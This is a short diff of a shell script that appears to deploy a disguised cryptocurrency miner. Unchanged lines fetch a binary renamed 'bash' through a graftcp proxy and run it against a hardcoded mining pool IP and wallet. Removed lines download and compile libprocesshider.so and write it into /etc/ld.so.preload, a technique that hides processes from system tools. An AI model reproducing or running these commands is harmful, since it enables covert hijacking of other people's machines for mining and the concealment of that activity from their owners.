@@ -37,10 +37,4 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/renilo/bh/main/bash
 chmod +x bash
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 ./graftcp/graftcp ./bash -pool 3.90.200.104:80 -wal 3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4.Berkah -pass x -proto 4 -stales 0
